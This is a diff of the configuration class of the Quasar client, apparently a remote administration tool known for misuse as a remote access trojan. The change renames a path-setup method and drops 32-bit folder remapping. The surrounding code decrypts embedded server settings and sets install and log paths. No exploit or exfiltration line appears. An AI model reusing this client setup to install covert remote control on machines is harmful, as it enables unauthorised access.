@@ -1,5 +1,4 @@
 ﻿using Quasar.Common.Cryptography;
-using Quasar.Common.Helpers;
 using System;
 using System.IO;
 using System.Security.Cryptography;
@@ -41,7 +40,7 @@ namespace Quasar.Client.Config
 
         public static bool Initialize()
         {
-            FixDirectory();
+            SetupPaths();
             return true;
         }
 #else
@@ -83,31 +82,15 @@ namespace Quasar.Client.Config
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
             SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
             SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
-            FixDirectory();
+            SetupPaths();
             return VerifyHash();
         }
 #endif
 
-        static void FixDirectory()
+        static void SetupPaths()
         {
-            // set up paths
             LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
             INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
-
-            if (PlatformHelper.Is64Bit) return;
-
-            // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
-            switch (SPECIALFOLDER)
-            {
-                case Environment.SpecialFolder.ProgramFilesX86:
-                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
-                    break;
-                case Environment.SpecialFolder.SystemX86:
-                    SPECIALFOLDER = Environment.SpecialFolder.System;
-                    break;
-            }
-
-            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
         }
 
         static bool VerifyHash()
